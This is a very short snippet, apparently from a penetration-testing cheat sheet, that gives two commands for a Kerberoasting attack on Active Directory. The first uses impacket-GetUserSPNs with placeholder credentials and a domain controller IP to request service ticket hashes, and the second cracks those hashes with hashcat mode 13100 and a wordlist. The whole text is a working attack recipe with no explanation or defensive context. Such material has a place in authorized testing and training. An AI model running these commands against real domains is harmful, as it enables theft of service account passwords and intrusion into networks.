Run the following impacket command
```Shell
impacket-GetUserSPNs domain.local/user:pass -dc-ip 1.2.3.4 -request
```

Crack the hash using the following command
```Shell
hashcat -a 0 -m 13100 hash.txt Pass.txt
```